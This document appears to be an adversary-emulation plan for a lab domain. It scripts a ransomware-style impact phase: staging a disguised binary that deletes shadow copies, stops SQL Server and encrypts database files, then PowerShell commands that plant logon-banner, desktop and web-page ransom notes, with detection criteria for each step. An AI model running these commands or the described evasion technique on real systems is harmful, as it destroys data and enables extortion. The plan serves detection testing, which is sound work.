> Impact

# Phase 5 — Impact: Data Encryption and Internal Defacement

## Overview

Phase 5 runs after Phase 4 collection and exfiltration are complete. Having exfiltrated
`ntds.dit`, registry hives, and IIS web configuration files, the operator executes the
final impact stage in two sequential steps:

**Step 1** targets IIS01 with three chained behaviors from the SYSTEM dnscat2 session
established in Phase 1: VSS shadow deletion prevents volume snapshot recovery, the
MSSQL service is stopped to release exclusive file locks, and the `UploadPortalDB`
database files are encrypted in place with AES-256. All three actions are delivered by
`CertMaint.exe` — a pre-compiled binary that consolidates VSS deletion via COM
(`IVssBackupComponents::DeleteSnapshots`), service control via SCM API
(`ControlService`/`StartServiceW`), and AES-256-CBC file encryption via memory-mapped
I/O with embedded tiny-AES-c — reducing the impact chain to a single process with no
child-process spawning.

**Step 2** announces the intrusion through two independent defacement channels — the
Windows domain logon banner on DC01 and the upload portal web root on IIS01 — using
the `TESTLAB\Administrator` dnscat2 session on DC01 (Phase 3) and the
`NT AUTHORITY\SYSTEM` dnscat2 session on IIS01 (Phase 1). The upload portal web root
(`C:\inetpub\upload.testlab.local\`) is owned by `IIS APPPOOL\upload.testlab.local`;
only a SYSTEM-level session can write to it from outside that AppPool.


| Step | Host | Session | Techniques |
| - | - | - | - |
| Step 1 | IIS01 | NT AUTHORITY\SYSTEM dnscat2 (IIS01) | T1490, T1489, T1486 |
| Step 2 | DC01 + IIS01 | TESTLAB\Administrator dnscat2 (DC01) + NT AUTHORITY\SYSTEM dnscat2 (IIS01) | T1491.001, T1112 |

---
## Step 1 — Recovery Inhibition, Service Stop, and Data Encryption (IIS01)

### Voice Track

With data safely exfiltrated, the attacker turns to impact on IIS01 using the SYSTEM
dnscat2 session that has persisted since Phase 1. The sequence mirrors real-world
operator-deployed ransomware: remove recovery options, unlock the target files, then
encrypt.

`CertMaint.exe` executes all three behaviors in a single process via direct Windows API
calls, eliminating the child-process chain that `vssadmin.exe`, `sc.exe`, and
`powershell.exe` would otherwise produce. VSS shadow copies are deleted through the COM
`IVssBackupComponents` interface loaded from `vssapi.dll` — the same internal path used
by `vssadmin.exe` itself, but without spawning a child process. The `MSSQL$SQLEXPRESS`
service is stopped and later restarted through the Service Control Manager API
(`OpenServiceW` / `ControlService` / `StartServiceW`) rather than `sc.exe`, so the only
Sysmon Event 1 record is the `CertMaint.exe` process itself. Each database file is then
opened with `GENERIC_READ | GENERIC_WRITE`, extended to a PKCS7-padded length via
`CreateFileMappingW`, and encrypted in-place with AES-256-CBC through the embedded
tiny-AES-c implementation — no temporary file, no child PowerShell process, and no
additional memory allocation beyond the mapped view.

The net effect is identical to the multi-process chain: VSS snapshots are gone, the
database files are overwritten with ciphertext, and `MSSQL$SQLEXPRESS` is back online
reporting RUNNING while `UploadPortalDB` becomes permanently inaccessible. The detection
surface is reduced to a single anomalous process writing `.mdf`/`.ldf` files.

### Procedures

#### Pre-step: Backup Database Files (IIS01 SYSTEM dnscat2)

- Backup the original database files to `C:\Windows\Temp\` before encryption (for lab restore)

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Copy-Item 'C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf' 'C:\Windows\Temp\UploadPortalDB.mdf.backup'; Copy-Item 'C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB_log.ldf' 'C:\Windows\Temp\UploadPortalDB_log.ldf.backup'"
  ```

  - ***Expected Output***

    ```text
    (no output — files copied silently)
    ```

- Verify backup files exist

  ```text
  C:\ProgramData> dir C:\Windows\Temp\UploadPortalDB*
  ```

  - ***Expected Output***

    ```text
    UploadPortalDB.mdf.backup       <original file size>
    UploadPortalDB_log.ldf.backup   <original file size>
    ```

#### Stage CertMaint.exe on IIS01 (Attacker Machine → react2shell)

- On the attacker machine, encode `CertMaint.exe` to base64

  ```bash
  cd resources/payloads/react2shell-tool
  python encode_payload.py ../ImpactPayload/impact.exe -o CertMaint.b64 -l 0
  ```

  - ***Expected Output***

    ```text
    [+] Encoding successful!
    [*] Lines: 1 x 0 chars
    ```

- Upload the base64 file to IIS01 via react2shell

  ```
  upload CertMaint.b64 C:\Windows\Temp\CertMaint.b64
  ```

  - ***Expected Output***

    ```text
    [+] File uploaded successfully -> C:\Windows\Temp\CertMaint.b64
    ```

- Decode to binary and promote to executable

  ```
  decode C:\Windows\Temp\CertMaint.b64 C:\ProgramData\CertMaint.bin
  rename C:\ProgramData\CertMaint.bin C:\ProgramData\CertMaint.exe
  ```

  - ***Expected Output***

    ```text
    [+] File decoded successfully -> C:\ProgramData\CertMaint.bin
    [+] File renamed: C:\ProgramData\CertMaint.bin -> C:\ProgramData\CertMaint.exe
    ```

#### Execute Impact Chain (IIS01 SYSTEM dnscat2)

- ☣️ Run `CertMaint.exe` — this deletes all VSS shadow copies, stops `MSSQL$SQLEXPRESS`,
  encrypts both database files with AES-256-CBC, and restarts the service

  ```text
  C:\ProgramData> CertMaint.exe --target "C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA" --service MSSQL$SQLEXPRESS --files UploadPortalDB.mdf,UploadPortalDB_log.ldf
  ```

  > **Key**: AES-256 key `RansomGrp2025!@#$%^&*()_+={|}:;"` (32 bytes),
  > IV `IIS01EncIV2025!@` (16 bytes) — hardcoded in `impact.c`.

  - ***Expected Output***

    ```text
    [+] VSS shadow copies deleted.
    [+] Service MSSQL$SQLEXPRESS stopped.
    [+] Encrypted: C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf
    [+] Encrypted: C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB_log.ldf
    [+] Service MSSQL$SQLEXPRESS started.
    [+] Impact chain complete.
    ```

#### Verify Encryption (IIS01 SYSTEM dnscat2)

- Confirm SQL Server is running and trigger a read on `UploadPortalDB` to surface Error 824

  ```text
  C:\ProgramData> sqlcmd -S localhost\SQLEXPRESS -E -C -Q "USE UploadPortalDB; SELECT TOP 1 * FROM INFORMATION_SCHEMA.TABLES"
  ```

  - ***Expected Output***

    ```text
    Msg 824, Level 24, State 6, Server IIS01\SQLEXPRESS, Line 1
    SQL Server detected a logical consistency-based I/O error: torn page (expected
    signature: 0xffffffff; actual signature: 0x2ce700fb). It occurred during a read of
    page (1:0) in database ID 5 at offset 0000000000000000 in file
    'C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf'.
    ```

    > **Error 824 (severity 24)** — torn-page detection failure. SQL Server writes a
    > protection signature into every 512-byte sector of each 8 KB page; AES-CBC
    > overwrites those signatures with ciphertext so the read-back values no longer match.
    > After a clean shutdown and restart, SQL Server uses deferred recovery and initially
    > reports `UploadPortalDB` as `ONLINE` — Error 824 fires on the first actual page I/O.
    > The database is unrecoverable without the AES-256 key.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Impact | T1490 | Inhibit System Recovery | Windows | Windows System Event 7 on IIS01: VSS provider reports shadow copy deletion with no preceding `vssadmin.exe` Sysmon Event 1 — deletion via COM `IVssBackupComponents::DeleteSnapshots` called directly from `CertMaint.exe`; supporting: Sysmon Event 1 shows `CertMaint.exe` (child of `cmd.exe`) at SYSTEM integrity as the sole process | Calibrated - Not Benign | `CertMaint.exe` deletes all VSS shadow copies on IIS01 via `IVssBackupComponents` COM interface loaded from `vssapi.dll`; no child process spawned — removes snapshot-based recovery path before database file encryption | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [impact.c](../../resources/payloads/ImpactPayload/impact.c) (deployed as `CertMaint.exe`) | - |
| Impact | T1489 | Service Stop | Windows | Windows System Event 7036 on IIS01: `MSSQL$SQLEXPRESS` service entered the stopped state; Sysmon Event 1 in the same time window shows `CertMaint.exe` at SYSTEM integrity with no `sc.exe` child — service stop originates from SCM API (`OpenServiceW`/`ControlService`) called directly within `CertMaint.exe` | Calibrated - Not Benign | `CertMaint.exe` stops `MSSQL$SQLEXPRESS` via SCM API to release exclusive OS file locks on `UploadPortalDB.mdf` and `UploadPortalDB_log.ldf`; service is restarted after encryption completes | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [impact.c](../../resources/payloads/ImpactPayload/impact.c) (deployed as `CertMaint.exe`) | - |
| Impact | T1486 | Data Encrypted for Impact | Windows | Sysmon Event 11 on IIS01: `CertMaint.exe` (child of `cmd.exe`, grandchild of `RuntimeBroker.exe` ghost) writes to `C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf` and `UploadPortalDB_log.ldf`; writing process is not a SQL Server service binary — anomalous writer identity for `.mdf`/`.ldf` file extensions; no `powershell.exe` child process | Calibrated - Not Benign | `CertMaint.exe` opens each database file with `GENERIC_READ\|GENERIC_WRITE`, extends it to PKCS7-padded length via `CreateFileMappingW`, and encrypts in-place with AES-256-CBC using embedded tiny-AES-c; `UploadPortalDB` becomes permanently unreadable (Error 824) without the decryption key | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [impact.c](../../resources/payloads/ImpactPayload/impact.c) (deployed as `CertMaint.exe`) | - |

---

## Step 2 — Impact: Internal Defacement (DC01 + IIS01)

### Voice Track

With the database encrypted and recovery inhibited, the attacker announces the intrusion
through two independent channels — one targeting every domain user, one targeting every
browser that reaches the organisation's internal web applications.

On DC01, the `LegalNoticeCaption` and `LegalNoticeText` registry keys under
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` are modified to
display a ransom message at the Windows logon screen. These keys are applied
domain-wide: any user logging into any domain-joined machine will see the notice before
their credentials are accepted, because the domain's Group Policy pulls the domain
controller's registry values. Ransom note text files are also dropped at
`C:\Users\Administrator\Desktop` and the `C:\` root so that the message is visible from
any Explorer or shell session on DC01.

On IIS01, the attacker writes a ransom note HTML page directly to the
`upload.testlab.local` web root using the SYSTEM dnscat2 session established in Phase 1.
The `upload.testlab.local` web root (`C:\inetpub\upload.testlab.local\`) is owned by
`IIS APPPOOL\upload.testlab.local`; the react2shell AppPool identity
(`IIS APPPOOL\react.testlab.local`) does not hold write access to it. The SYSTEM session
caries no such restriction: `powershell.exe` running at SYSTEM integrity writes
`index.html` directly into `C:\inetpub\upload.testlab.local\`. From this point, any
browser navigating to `http://upload.testlab.local` receives the ransom page instead of
the upload portal.

### Procedures

- ☣️ From the DC01 dnscat2 shell, set the logon-screen ransom notice in the registry

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name LegalNoticeCaption -Value '!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!' -Type String -Force; Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name LegalNoticeText -Value 'Your network has been compromised. All data has been exfiltrated and encrypted. To recover your files contact us at: ransomgroup.onion within 72 hours.' -Type String -Force"
  ```

  - ***Expected Output***

    ```text
    (no output — registry values set silently)
    ```

- Verify the registry values were written

  ```text
  C:\ProgramData> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LegalNoticeCaption
  C:\ProgramData> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LegalNoticeText
  ```

  - ***Expected Output***

    ```text
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
        LegalNoticeCaption    REG_SZ    !!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!

    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
        LegalNoticeText    REG_SZ    Your network has been compromised...
    ```

- ☣️ Drop ransom note text files on DC01

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Set-Content 'C:\README_DECRYPT.txt' 'ALL YOUR FILES HAVE BEEN ENCRYPTED. Contact ransomgroup.onion within 72 hours.'; Set-Content 'C:\Users\Administrator\Desktop\README_DECRYPT.txt' 'ALL YOUR FILES HAVE BEEN ENCRYPTED. Contact ransomgroup.onion within 72 hours.'"
  ```

  - ***Expected Output***

    ```text
    (no output — files written silently)
    ```

- ☣️ From the IIS01 SYSTEM dnscat2 shell, write the ransom note HTML page to the upload portal web root

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Set-Content 'C:\inetpub\upload.testlab.local\index.html' '<html><head><title>ENCRYPTED</title></head><body style=""background:#000;color:#f00;font-family:monospace;padding:40px""><h1>!!! YOUR NETWORK HAS BEEN COMPROMISED !!!</h1><p>All files on this network have been encrypted and exfiltrated.</p><p>Contact us at <b>ransomgroup.onion</b> within 72 hours to negotiate decryption.</p></body></html>' -Encoding UTF8"
  ```

  - ***Expected Output***

    ```text
    (no output — file written silently)
    ```

- Verify the web defacement from the attacker machine

  ```bash
  curl -s http://upload.testlab.local/ | head -5
  ```

  - ***Expected Output***

    ```text
    <html><head><title>ENCRYPTED</title></head><body style="background:#000;...
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 13 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) writes `LegalNoticeCaption` and `LegalNoticeText` string values under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`; registry key path matches Windows logon-screen policy | Calibrated - Not Benign | `Set-ItemProperty` modifies `LegalNoticeCaption` and `LegalNoticeText` on DC01 to display a ransom message at domain logon — affects all domain-joined machines drawing policy from this DC | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Defense Evasion | T1112 | Modify Registry | Windows | Sysmon Event 13 on DC01: `powershell.exe` sets `LegalNoticeCaption` (REG_SZ) and `LegalNoticeText` (REG_SZ) under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` via `Set-ItemProperty`; parent process is `RuntimeBroker.exe` ghost | Not Calibrated - Not Benign | Registry modification implementing the logon-banner defacement; same physical event as T1491.001 above but independently scored as a registry-modification behavior | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) creates `README_DECRYPT.txt` at `C:\` and `C:\Users\Administrator\Desktop\` | Calibrated - Not Benign | `Set-Content` drops ransom note text files at two paths on DC01; file name `README_DECRYPT.txt` matches ransomware ransom-note naming convention | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on IIS01: `powershell.exe` (child of `cmd.exe`, grandchild of `RuntimeBroker.exe` ghost) creates `index.html` in `C:\inetpub\upload.testlab.local\`; writing process identity is NT AUTHORITY\SYSTEM — anomalous for a web root file write where the expected writer is an IIS AppPool; HTTP access to `upload.testlab.local/` now returns ransom page | Calibrated - Not Benign | `Set-Content` from the SYSTEM dnscat2 shell overwrites the upload portal landing page (`C:\inetpub\upload.testlab.local\index.html`) with a ransom HTML page; `IIS APPPOOL\react.testlab.local` lacks write access to this directory — SYSTEM identity is required | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |

---

